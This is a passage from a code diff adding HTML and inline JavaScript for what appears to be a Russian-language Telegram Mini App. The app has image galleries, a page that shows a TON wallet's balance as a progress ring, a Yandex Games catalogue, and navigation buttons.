+							<div class="img" style="background-image:url(https://cdn.dribbble.com/userupload/2740678/file/original-ec284b452ae3634ff7b75d3f838f2598.png?compress=1&amp;resize=1504x1128)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/userupload/2740680/file/original-a66e39118f1e7e005163ef9ccd01b4d9.png?compress=1&amp;resize=1504x1128)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/userupload/2740680/file/original-a66e39118f1e7e005163ef9ccd01b4d9.png?compress=1&amp;resize=1504x1128)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18096610/media/482e3585e6ddc3a7c556b00b845f3fc5.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18096610/media/482e3585e6ddc3a7c556b00b845f3fc5.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18030490/media/010e29c84195f7493ca8667c731fd568.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18030490/media/010e29c84195f7493ca8667c731fd568.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18008595/media/e94056dfaa0ea5f46ba5353bd3c900ce.png?compress=1&amp;resize=1600x1200&amp;vertical=top)">
+							<div class="img" style="background-image:url(https://cdn.dribbble.com/users/383277/screenshots/18008595/media/e94056dfaa0ea5f46ba5353bd3c900ce.png?compress=1&amp;resize=1600x1200&amp;vertical=top)"></div>
+						</div>
+					</div>
+					<div class="images-line">
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/disp/5750c4124066597.610413cf51d4f.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/disp/5750c4124066597.610413cf51d4f.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/3d79f9130553681.61831a626deb2.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/3d79f9130553681.61831a626deb2.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/1e7be1130553681.61831a626fa05.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/1e7be1130553681.61831a626fa05.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/7ab9fa130553681.61831a626d7ca.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/7ab9fa130553681.61831a626d7ca.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/27cc0d130553681.61831a626b37b.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/27cc0d130553681.61831a626b37b.png)"></div>
+						</div>
+
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/disp/5750c4124066597.610413cf51d4f.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/disp/5750c4124066597.610413cf51d4f.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/3d79f9130553681.61831a626deb2.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/3d79f9130553681.61831a626deb2.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/1e7be1130553681.61831a626fa05.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/1e7be1130553681.61831a626fa05.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/7ab9fa130553681.61831a626d7ca.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/7ab9fa130553681.61831a626d7ca.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/27cc0d130553681.61831a626b37b.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/27cc0d130553681.61831a626b37b.png)"></div>
+						</div>
+
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/disp/5750c4124066597.610413cf51d4f.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/disp/5750c4124066597.610413cf51d4f.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/3d79f9130553681.61831a626deb2.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/3d79f9130553681.61831a626deb2.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/1e7be1130553681.61831a626fa05.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/1e7be1130553681.61831a626fa05.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/7ab9fa130553681.61831a626d7ca.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/7ab9fa130553681.61831a626d7ca.png)"></div>
+						</div>
+						<div class="line" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/27cc0d130553681.61831a626b37b.png)">
+							<div class="img" style="background-image:url(https://mir-s3-cdn-cf.behance.net/project_modules/fs/27cc0d130553681.61831a626b37b.png)"></div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</main>
+	</div>
+</div>
+</div>
+
+<div id="tokenPage">
+	<div>
+  		<button id="homescreen" style="position: fixed; top: 1%; left: 5%; z-index: 10" onclick="tg.setEmojiStatus(tg.initDataUnsafe.user.id, '5213305508034783384')">
+		<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" transform="matrix(1, 0, 0, 1, 0, 0)rotate(0)"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g clip-path="url(#clip0_429_11177)"> <path d="M19 10V19C19 20.1046 18.1046 21 17 21H7C5.89543 21 5 20.1046 5 19V10M21 12L12 3L3 12" stroke="#292929" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></path> </g> <defs> <clipPath id="clip0_429_11177"> <rect width="24" height="24" fill="white"></rect> </clipPath> </defs> </g></svg>
+		</button>
+
+		<p id="usdt"><span class="fancy">Mk.Token</span></p>
+		<div id="hh">
+  		<div class="withdraw" onclick="trans()">Поддержать</div>
+		</div>
+    <!---<div id="hh">
+  		  <div class="support" onclick="getMktTokens()">Support</div>
+		</div>-->
+
+	</div>
+	
+  <section id="contentyy">
+  <svg style="transform:rotate(-90deg);" viewBox="-25 -25 250 250" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <linearGradient id="Gradient2" x1="0" x2="0" y1="0" y2="1">
+      <stop offset="0%" stop-color="№250055" />
+      <stop offset="40%" stop-color="#5200a3" />
+      <stop offset="60%" stop-color="#6600ff" />
+      <stop offset="80%" stop-color="#3e00b3" />
+      <stop offset="100%" stop-color="#070055" />
+    </linearGradient>
+	<mask id="circle-mask">
+      <circle cx="150" cy="150" r="145" fill="white"/>
+      <circle cx="150" cy="150" r="140" fill="black"/>
+    </mask>
+    <filter id="glow">
+      <feGaussianBlur stdDeviation="5"/>
+      <feComponentTransfer>
+        <feFuncA type="linear" slope="1" />
+      </feComponentTransfer>
+      <feBlend in2="SourceGraphic" />
+    </filter>
+	<g filter="url(#glow)">      
+    <circle r="90" cx="100" cy="100" fill="transparent" stroke="#e0e0e0" stroke-width="16px" stroke-dasharray="564.48px" stroke-dashoffset="0"></circle>
+    <circle id="circle" r="90" cx="100" cy="100" stroke="url(#Gradient2)" stroke-width="16px" stroke-linecap="round" stroke-dashoffset="100.48px" fill="transparent" stroke-dasharray="660px"></circle>
+  </g>
+
+    <text id="val" x="40.5%" y="42.5%" text-anchor="middle" stroke="transparent" fill="url(#Gradient2)" font-size="22px" align="center" font-weight="bold" style="font-family: 'Manrope', sans-serif; transform:rotate(90deg) translate(0px, -196px)">#</text>
+
+  </svg>
+  <h1 id="tonBalance">875,4 / 1000 TON</h1>
+  <h2>Ликвидность</h2>
+  <!---<input type="range" min="0" max="100" value="0" oninput="range(this.value)">-->
+<br>
+<script>
+    setInterval(async function() {
+        
+		//test
+
+    }, 1000);
+	window.onload = function(){
+        setTimeout(tonBalance, 2000)
+    }
+	async function tonBalance() {
+		// console.log(document.getElementById("circle").style.strokeDashoffset);
+		//const currentWallet = tonConnectUI.wallet.account.address;
+      	const ton = await fetch(`https://tonapi.io/v2/accounts/UQCwZJMC1YRv_kG2Q6CF0H74t3IcWrRjJn1aE4nDWYj_ILUp`);
+		const wallet = await ton.json();
+
+		const balance = wallet.balance / 1000000000;
+      	const truncateToThree = num => Math.floor(num * 1000) / 1000;
+
+      	console.log(truncateToThree(balance) + " TON");
+
+		percent = (truncateToThree(balance) * 100 / 1000);
+
+  		document.getElementById('circle').style.strokeDashoffset = 750 + percent * 6.6; 
+  		document.getElementById('val').innerHTML = percent + "%";
+  		document.getElementById('tonBalance').innerHTML = truncateToThree(balance) + " / 1000 TON";
+
+
+	}
+    function range(v){
+  //document.getElementById('val').innerHTML = v+"%";
+  
+}
+  </script>
+	<!--<h2>Здесь пока ничего нет...</h2>-->
+	<br>
+	
+</div>
+
+<div id="gamesPage">
+	<div>
+  		<div id="ton-connect" style="position: absolute; top: 2%; right: 5%; z-index: 10"></div>
+  		<button id="homescreen" style="position: fixed; top: 1%; left: 5%; z-index: 10" onclick="tg.addToHomeScreen()">
+		<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" transform="matrix(1, 0, 0, 1, 0, 0)rotate(0)"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g clip-path="url(#clip0_429_11177)"> <path d="M19 10V19C19 20.1046 18.1046 21 17 21H7C5.89543 21 5 20.1046 5 19V10M21 12L12 3L3 12" stroke="#292929" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></path> </g> <defs> <clipPath id="clip0_429_11177"> <rect width="24" height="24" fill="white"></rect> </clipPath> </defs> </g></svg>
+		</button>
+		<p id="usdt"><span class="fancy">Все игры</span></p>
+		<div id="hh">
+  		<div class="withdraw" onclick="trans()">Онлайн</div>
+		</div>
+    <!---<div id="hh">
+  		  <div class="support" onclick="getMktTokens()">Support</div>
+		</div>-->
+
+	</div>
+  <section id="contentyy">
+	<h1 style="padding: 40px 0px 0px 0px;">Яндекс.Игры</h1>
+	<!--<h2>Здесь пока ничего нет...</h2>-->
+	<br>
+	   <div class="scrollmenu">
+  <div onclick="location.href='http://www.example.com'" href="#home" class="cataloggames" style="background: url(https://avatars.mds.yandex.net/get-games/2977039/2a00000193a7b7a865bf76d7dd104b6f4305/pjpg350x209); background-size: 100% auto;">
+	<svg style="width: 50px; height: 50px; position: absolute; bottom: 1%; right: 1%; transform: scale(0.8);" xmlns="http://www.w3.org/2000/svg" width="46.92" height="46.88" x="0.000"><path fill="#fff" d="M11.356 8.833h23.975v29.022H11.356z"/><path fill="#fc3f1d" d="M23.48-.12C10.52-.12 0 10.36 0 23.24 0 36.16 10.52 46.6 23.48 46.6c12.92 0 23.44-10.44 23.44-23.36C46.92 10.36 36.4-.12 23.48-.12Zm3.04 37.24V13.08h-2.16c-3.96 0-6.04 2-6.04 4.96 0 3.36 1.44 4.92 4.4 6.92l2.44 1.64-7.04 10.52h-5.24l6.32-9.4c-3.64-2.6-5.68-5.12-5.68-9.4 0-5.36 3.72-9 10.8-9h7.04v27.8Z"/></svg>
+ </div>
+ <div onclick="location.href='http://www.example.com'" href="#home" class="cataloggames" style="background: url(https://avatars.mds.yandex.net/get-games/1881364/2a00000193a365ef9dac4684fe7235f00f15/pjpg350x209); background-size: 100% auto;">
+	<svg style="width: 50px; height: 50px; position: absolute; bottom: 1%; right: 1%; transform: scale(0.8);" xmlns="http://www.w3.org/2000/svg" width="46.92" height="46.88" x="0.000"><path fill="#fff" d="M11.356 8.833h23.975v29.022H11.356z"/><path fill="#fc3f1d" d="M23.48-.12C10.52-.12 0 10.36 0 23.24 0 36.16 10.52 46.6 23.48 46.6c12.92 0 23.44-10.44 23.44-23.36C46.92 10.36 36.4-.12 23.48-.12Zm3.04 37.24V13.08h-2.16c-3.96 0-6.04 2-6.04 4.96 0 3.36 1.44 4.92 4.4 6.92l2.44 1.64-7.04 10.52h-5.24l6.32-9.4c-3.64-2.6-5.68-5.12-5.68-9.4 0-5.36 3.72-9 10.8-9h7.04v27.8Z"/></svg>
+ </div>
+ <div onclick="location.href='http://www.example.com'" href="#home" class="cataloggames" style="background: url(https://avatars.mds.yandex.net/get-games/1890793/2a00000193bca2fd67dd1c55b2c48aa6b6f1/pjpg350x209); background-size: 100% auto;">
+	<svg style="width: 50px; height: 50px; position: absolute; bottom: 1%; right: 1%; transform: scale(0.8);" xmlns="http://www.w3.org/2000/svg" width="46.92" height="46.88" x="0.000"><path fill="#fff" d="M11.356 8.833h23.975v29.022H11.356z"/><path fill="#fc3f1d" d="M23.48-.12C10.52-.12 0 10.36 0 23.24 0 36.16 10.52 46.6 23.48 46.6c12.92 0 23.44-10.44 23.44-23.36C46.92 10.36 36.4-.12 23.48-.12Zm3.04 37.24V13.08h-2.16c-3.96 0-6.04 2-6.04 4.96 0 3.36 1.44 4.92 4.4 6.92l2.44 1.64-7.04 10.52h-5.24l6.32-9.4c-3.64-2.6-5.68-5.12-5.68-9.4 0-5.36 3.72-9 10.8-9h7.04v27.8Z"/></svg>
+ </div>
+ <div onclick="location.href='http://www.example.com'" href="#home" class="cataloggames" style="background: url(	https://avatars.mds.yandex.net/get-games/1881957/2a00000193b03ceac6336e7072255c1c8ff4/pjpg350x209); background-size: 100% auto;">
+	<svg style="width: 50px; height: 50px; position: absolute; bottom: 1%; right: 1%; transform: scale(0.8);" xmlns="http://www.w3.org/2000/svg" width="46.92" height="46.88" x="0.000"><path fill="#fff" d="M11.356 8.833h23.975v29.022H11.356z"/><path fill="#fc3f1d" d="M23.48-.12C10.52-.12 0 10.36 0 23.24 0 36.16 10.52 46.6 23.48 46.6c12.92 0 23.44-10.44 23.44-23.36C46.92 10.36 36.4-.12 23.48-.12Zm3.04 37.24V13.08h-2.16c-3.96 0-6.04 2-6.04 4.96 0 3.36 1.44 4.92 4.4 6.92l2.44 1.64-7.04 10.52h-5.24l6.32-9.4c-3.64-2.6-5.68-5.12-5.68-9.4 0-5.36 3.72-9 10.8-9h7.04v27.8Z"/></svg>
+ </div>
+ <div onclick="location.href='http://www.example.com'" href="#home" class="cataloggames" style="background: url(	https://avatars.mds.yandex.net/get-games/1890793/2a00000193b1843e894de6829ac8b797f7ca/pjpg350x209); background-size: 100% auto;">
+	<svg style="width: 50px; height: 50px; position: absolute; bottom: 1%; right: 1%; transform: scale(0.8);" xmlns="http://www.w3.org/2000/svg" width="46.92" height="46.88" x="0.000"><path fill="#fff" d="M11.356 8.833h23.975v29.022H11.356z"/><path fill="#fc3f1d" d="M23.48-.12C10.52-.12 0 10.36 0 23.24 0 36.16 10.52 46.6 23.48 46.6c12.92 0 23.44-10.44 23.44-23.36C46.92 10.36 36.4-.12 23.48-.12Zm3.04 37.24V13.08h-2.16c-3.96 0-6.04 2-6.04 4.96 0 3.36 1.44 4.92 4.4 6.92l2.44 1.64-7.04 10.52h-5.24l6.32-9.4c-3.64-2.6-5.68-5.12-5.68-9.4 0-5.36 3.72-9 10.8-9h7.04v27.8Z"/></svg>
+ </div>
+</div>
+       <br>
+	
+
+<h1 style="padding: 40px 0px 0px 0px;">Игры в Разработке</h1>
+	<!--<h2>Здесь пока ничего нет...</h2>-->
+	<br>
+	   <div class="scrollmenu">
+  <div href="#home" class="cataloggames" style="background: url(https://avatars.mds.yandex.net/i?id=5df1f4ea3921e895bc8c9d143fa9d492d844a198-4438849-images-thumbs&n=13); background-size: 100% auto;">
+	<!--<svg style="width: 50px; height: 50px; position: absolute; bottom: 1%; right: 1%; transform: scale(0.8);" xmlns="http://www.w3.org/2000/svg" width="46.92" height="46.88" x="0.000"><path fill="#fff" d="M11.356 8.833h23.975v29.022H11.356z"/><path fill="#fc3f1d" d="M23.48-.12C10.52-.12 0 10.36 0 23.24 0 36.16 10.52 46.6 23.48 46.6c12.92 0 23.44-10.44 23.44-23.36C46.92 10.36 36.4-.12 23.48-.12Zm3.04 37.24V13.08h-2.16c-3.96 0-6.04 2-6.04 4.96 0 3.36 1.44 4.92 4.4 6.92l2.44 1.64-7.04 10.52h-5.24l6.32-9.4c-3.64-2.6-5.68-5.12-5.68-9.4 0-5.36 3.72-9 10.8-9h7.04v27.8Z"/></svg>
+-->	<svg style="width: 50px; height: 50px; position: absolute; bottom: 1%; right: 1%; transform: scale(0.8);" viewBox="-2.4 -2.4 28.80 28.80" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"><rect x="-2.4" y="-2.4" width="28.80" height="28.80" rx="14.4" fill="#ffffff" strokewidth="0"></rect></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M5.32914 19.4213C5.21914 19.4213 5.09914 19.3913 4.99914 19.3413L2.77914 18.2312C2.52914 18.1012 2.36914 17.8412 2.36914 17.5612V14.7812C2.36914 14.3713 2.70914 14.0312 3.11914 14.0312C3.52914 14.0312 3.86914 14.3713 3.86914 14.7812V17.0913L5.66914 18.0013C6.03914 18.1813 6.18914 18.6313 5.99914 19.0013C5.86914 19.2613 5.60914 19.4213 5.32914 19.4213Z" fill="#292D32"></path> <path d="M11.9995 22.7488C11.9395 22.7488 11.8795 22.7388 11.8295 22.7288C11.7695 22.7188 11.7095 22.6888 11.6495 22.6588L9.43947 21.5588C9.06947 21.3688 8.91947 20.9187 9.09947 20.5487C9.28947 20.1787 9.73947 20.0287 10.1095 20.2087L11.2495 20.7788V19.2188C11.2495 18.8088 11.5895 18.4688 11.9995 18.4688C12.4095 18.4688 12.7495 18.8088 12.7495 19.2188V20.7788L13.8895 20.2087C14.2595 20.0287 14.7095 20.1787 14.8995 20.5487C15.0895 20.9187 14.9395 21.3688 14.5595 21.5588L12.3495 22.6588C12.2895 22.6888 12.2295 22.7088 12.1695 22.7288C12.1095 22.7388 12.0595 22.7488 11.9995 22.7488Z" fill="#292D32"></path> <path d="M18.6702 19.4191C18.4002 19.4191 18.1302 19.2691 18.0002 19.0091C17.8102 18.6391 17.9602 18.1891 18.3402 17.9991L20.1502 17.0991V14.7891C20.1502 14.3791 20.4902 14.0391 20.9002 14.0391C21.3102 14.0391 21.6502 14.3791 21.6502 14.7891V17.5691C21.6502 17.8491 21.4902 18.1091 21.2402 18.2391L19.0002 19.3391C18.8902 19.3891 18.7802 19.4191 18.6702 19.4191Z" fill="#292D32"></path> <path d="M11.9995 14.4191C11.5895 14.4191 11.2495 14.0791 11.2495 13.6691V11.3591L9.43947 10.4591C9.06947 10.2691 8.91947 9.81907 9.09947 9.44907C9.28947 9.07907 9.73947 8.92907 10.1095 9.10907L11.9995 10.0491L13.8895 9.10907C14.2595 8.92907 14.7095 9.06907 14.8995 9.44907C15.0895 9.81907 14.9395 10.2691 14.5595 10.4591L12.7495 11.3591V13.6691C12.7495 14.0791 12.4095 14.4191 11.9995 14.4191Z" fill="#292D32"></path> <path d="M3.10938 9.96807C2.69938 9.96807 2.35938 9.62807 2.35938 9.21807V6.45807V6.44807C2.35938 6.38807 2.36938 6.32807 2.37938 6.27807C2.39938 6.18807 2.42938 6.11807 2.46938 6.04807C2.49938 5.99807 2.53938 5.95807 2.57938 5.91807C2.61938 5.87807 2.66938 5.83807 2.71938 5.80807C2.73938 5.79807 2.76938 5.77807 2.78938 5.76807L4.99938 4.65807C5.36938 4.47807 5.81938 4.62807 5.99938 4.99807C6.18938 5.36807 6.03938 5.81807 5.66938 5.99807L4.78938 6.43807L5.66938 6.87807C6.03938 7.06807 6.18938 7.51807 5.99938 7.88807C5.81938 8.25807 5.36938 8.40807 4.99938 8.22807L3.85938 7.65807V9.21807C3.85938 9.63807 3.52937 9.96807 3.10938 9.96807Z" fill="#292D32"></path> <path d="M14.2198 3.85859C14.1098 3.85859 13.9898 3.82859 13.8898 3.77859L11.9998 2.83859L10.1098 3.77859C9.73981 3.96859 9.28981 3.81859 9.10981 3.44859C8.91981 3.07859 9.06981 2.62859 9.43981 2.43859L11.6598 1.32859C11.8698 1.21859 12.1198 1.21859 12.3298 1.32859L14.5498 2.43859C14.9198 2.62859 15.0698 3.07859 14.8898 3.44859C14.7598 3.70859 14.4998 3.85859 14.2198 3.85859Z" fill="#292D32"></path> <path d="M20.8904 9.96807C20.4804 9.96807 20.1404 9.62807 20.1404 9.21807V7.65807L19.0004 8.22807C18.6304 8.40807 18.1804 8.25807 18.0004 7.88807C17.8104 7.51807 17.9604 7.06807 18.3404 6.87807L19.2204 6.43807L18.3304 5.99807C17.9604 5.81807 17.8104 5.36807 18.0004 4.99807C18.1904 4.62807 18.6304 4.47807 19.0004 4.65807L21.2104 5.75807C21.2304 5.76807 21.2604 5.77807 21.2804 5.79807C21.3404 5.82807 21.3904 5.87807 21.4404 5.92807C21.4704 5.96807 21.5004 6.00807 21.5304 6.04807C21.5704 6.11807 21.6004 6.18807 21.6204 6.26807C21.6304 6.32807 21.6404 6.38807 21.6404 6.43807V6.44807V9.20807C21.6404 9.63807 21.3004 9.96807 20.8904 9.96807Z" fill="#292D32"></path> </g></svg>
+ </div>
+</div>
+       <br>
+       <br>
+       <br>
+	
+</div>
+
+<div id="settingsPage">
+	<div>
+  		<div id="ton-connect" style="position: absolute; top: 2%; right: 5%; z-index: 10"></div>
+  		<button id="homescreen" style="position: fixed; top: 1%; left: 5%; z-index: 10" onclick="tg.addToHomeScreen()">
+		<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" transform="matrix(1, 0, 0, 1, 0, 0)rotate(0)"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g clip-path="url(#clip0_429_11177)"> <path d="M19 10V19C19 20.1046 18.1046 21 17 21H7C5.89543 21 5 20.1046 5 19V10M21 12L12 3L3 12" stroke="#292929" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"></path> </g> <defs> <clipPath id="clip0_429_11177"> <rect width="24" height="24" fill="white"></rect> </clipPath> </defs> </g></svg>
+		</button>
+		<p id="usdt"><span class="fancy">Настройки</span></p>
+		<div id="hh">
+  		<div class="withdraw" onclick="trans()">Задания</div>
+		</div>
+    <!---<div id="hh">
+  		  <div class="support" onclick="getMktTokens()">Support</div>
+		</div>-->
+
+	</div>
+  <section id="contentyy">
+	<h1 style="padding: 40px 0px 0px 0px;">Здесь пока ничего нет :(</h1>
+  <h2>Приходите позже</h2>
+	<!--<h2>Здесь пока ничего нет...</h2>-->
+
+</div>
+
+	<div id="menuDiv">
+  <div class="menu" onclick="this.classList.toggle('open')">
+
+  <div class="button" onclick="document.getElementById('mainPage').style.display = 'none'; document.getElementById('missionsPage').style.display = 'block'; document.getElementById('tokenPage').style.display = 'none'; document.getElementById('gamesPage').style.display = 'none'; document.getElementById('settingsPage').style.display = 'none';  document.getElementById('musicPage').style.display = 'none';">
+	<svg style="position: absolute; bottom: 1%; right: 1%; transform: scale(0.7);" fill="#000000" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 305.406 305.406" xml:space="preserve"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g> <g> <g> <path d="M77.202,127.888c0,4.971,4.029,9,9,9h130.575c4.971,0,9-4.029,9-9s-4.029-9-9-9H86.202 C81.231,118.888,77.202,122.917,77.202,127.888z"></path> <path d="M86.202,168.538h130.575c4.971,0,9-4.029,9-9c0-4.971-4.029-9-9-9H86.202c-4.971,0-9,4.029-9,9 C77.202,164.509,81.231,168.538,86.202,168.538z"></path> <path d="M86.202,60.538h44.341c4.971,0,9-4.029,9-9c0-4.971-4.029-9-9-9H86.202c-4.971,0-9,4.029-9,9 C77.202,56.509,81.231,60.538,86.202,60.538z"></path> <path d="M149.503,242.374H86.202c-4.971,0-9,4.029-9,9c0,4.971,4.029,9,9,9h63.301c4.971,0,9-4.029,9-9 S154.474,242.374,149.503,242.374z"></path> <path d="M149.503,214.512H86.202c-4.971,0-9,4.029-9,9c0,4.971,4.029,9,9,9h63.301c4.971,0,9-4.029,9-9 C158.503,218.541,154.474,214.512,149.503,214.512z"></path> <path d="M267.067,70.613L199.091,2.636C197.402,0.948,195.113,0,192.727,0H44.703c-4.971,0-9,4.029-9,9v287.406 c0,4.971,4.029,9,9,9h216c4.971,0,9-4.029,9-9V76.977C269.703,74.59,268.755,72.301,267.067,70.613z M199.727,28.728 l41.249,41.249h-41.249V28.728z M251.703,287.406h-198V18h128.023v60.977c0,4.971,4.029,9,9,9h60.977V287.406z"></path> <path d="M199.976,208.512c-16.078,0-29.158,13.081-29.158,29.159s13.08,29.158,29.158,29.158s29.158-13.08,29.158-29.158 S216.054,208.512,199.976,208.512z M199.976,248.829c-6.152,0-11.158-5.005-11.158-11.158c0-6.153,5.006-11.159,11.158-11.159 c6.152,0,11.158,5.006,11.158,11.159C211.134,243.824,206.128,248.829,199.976,248.829z"></path> </g> </g> </g> </g></svg>
+  </div>
+
+  <div class="button" onclick="document.getElementById('mainPage').style.display = 'block'; document.getElementById('missionsPage').style.display = 'none'; document.getElementById('tokenPage').style.display = 'none'; document.getElementById('gamesPage').style.display = 'none'; document.getElementById('settingsPage').style.display = 'none';  document.getElementById('musicPage').style.display = 'none';">
+	<svg style="position: absolute; bottom: 1%; right: 1%; transform: scale(1);" viewBox="-2.4 -2.4 28.80 28.80" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" stroke-width="0"><rect x="-2.4" y="-2.4" width="28.80" height="28.80" rx="14.4" fill="#ffffff" strokewidth="0"></rect></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M5.32914 19.4213C5.21914 19.4213 5.09914 19.3913 4.99914 19.3413L2.77914 18.2312C2.52914 18.1012 2.36914 17.8412 2.36914 17.5612V14.7812C2.36914 14.3713 2.70914 14.0312 3.11914 14.0312C3.52914 14.0312 3.86914 14.3713 3.86914 14.7812V17.0913L5.66914 18.0013C6.03914 18.1813 6.18914 18.6313 5.99914 19.0013C5.86914 19.2613 5.60914 19.4213 5.32914 19.4213Z" fill="#292D32"></path> <path d="M11.9995 22.7488C11.9395 22.7488 11.8795 22.7388 11.8295 22.7288C11.7695 22.7188 11.7095 22.6888 11.6495 22.6588L9.43947 21.5588C9.06947 21.3688 8.91947 20.9187 9.09947 20.5487C9.28947 20.1787 9.73947 20.0287 10.1095 20.2087L11.2495 20.7788V19.2188C11.2495 18.8088 11.5895 18.4688 11.9995 18.4688C12.4095 18.4688 12.7495 18.8088 12.7495 19.2188V20.7788L13.8895 20.2087C14.2595 20.0287 14.7095 20.1787 14.8995 20.5487C15.0895 20.9187 14.9395 21.3688 14.5595 21.5588L12.3495 22.6588C12.2895 22.6888 12.2295 22.7088 12.1695 22.7288C12.1095 22.7388 12.0595 22.7488 11.9995 22.7488Z" fill="#292D32"></path> <path d="M18.6702 19.4191C18.4002 19.4191 18.1302 19.2691 18.0002 19.0091C17.8102 18.6391 17.9602 18.1891 18.3402 17.9991L20.1502 17.0991V14.7891C20.1502 14.3791 20.4902 14.0391 20.9002 14.0391C21.3102 14.0391 21.6502 14.3791 21.6502 14.7891V17.5691C21.6502 17.8491 21.4902 18.1091 21.2402 18.2391L19.0002 19.3391C18.8902 19.3891 18.7802 19.4191 18.6702 19.4191Z" fill="#292D32"></path> <path d="M11.9995 14.4191C11.5895 14.4191 11.2495 14.0791 11.2495 13.6691V11.3591L9.43947 10.4591C9.06947 10.2691 8.91947 9.81907 9.09947 9.44907C9.28947 9.07907 9.73947 8.92907 10.1095 9.10907L11.9995 10.0491L13.8895 9.10907C14.2595 8.92907 14.7095 9.06907 14.8995 9.44907C15.0895 9.81907 14.9395 10.2691 14.5595 10.4591L12.7495 11.3591V13.6691C12.7495 14.0791 12.4095 14.4191 11.9995 14.4191Z" fill="#292D32"></path> <path d="M3.10938 9.96807C2.69938 9.96807 2.35938 9.62807 2.35938 9.21807V6.45807V6.44807C2.35938 6.38807 2.36938 6.32807 2.37938 6.27807C2.39938 6.18807 2.42938 6.11807 2.46938 6.04807C2.49938 5.99807 2.53938 5.95807 2.57938 5.91807C2.61938 5.87807 2.66938 5.83807 2.71938 5.80807C2.73938 5.79807 2.76938 5.77807 2.78938 5.76807L4.99938 4.65807C5.36938 4.47807 5.81938 4.62807 5.99938 